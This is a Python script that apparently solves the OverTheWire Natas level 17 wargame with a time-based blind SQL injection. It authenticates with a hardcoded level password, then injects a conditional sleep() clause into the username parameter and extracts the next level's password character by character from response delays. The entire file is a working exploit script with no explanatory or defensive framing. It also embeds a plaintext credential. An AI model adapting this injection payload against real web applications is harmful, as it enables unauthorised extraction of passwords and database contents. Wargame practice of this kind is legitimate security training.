import httplib2
import urllib
import time

website = httplib2.Http()
website.add_credentials('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')

password = "" #Blank for know. Will be added to as the code guess chars
charSet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

counter = 0 #will iterate if there is a correct guess

while counter < len(charSet):
	#query will have the SQL server sleep for 5 seconds to determine if the query was sucessful
	query = urllib.urlencode(dict(username="natas18\" AND if(password LIKE BINARY \"" + password + charSet[counter] + "%\", sleep(5), 0) ;# "))
	Start = int(time.time()) #variable to keep track of time when request was first made
	resp, content = website.request("http://natas17.natas.labs.overthewire.org/index.php?" + query, method="POST")
	End = int(time.time()) #when the response is received
	difference = End - Start #calculate the difference in the response time
	#Check to see if the query was successful
	if (difference >= 5):
		password += charSet[counter] #keep adding to password as characters are successful in the query
		print "Password attempt was: " + password
		counter = 0 #rest back to beginning of character of set, since we just got a successful hit
		continue #continue with the while loop
	else:
		counter += 1 #move up the characterset if not a match

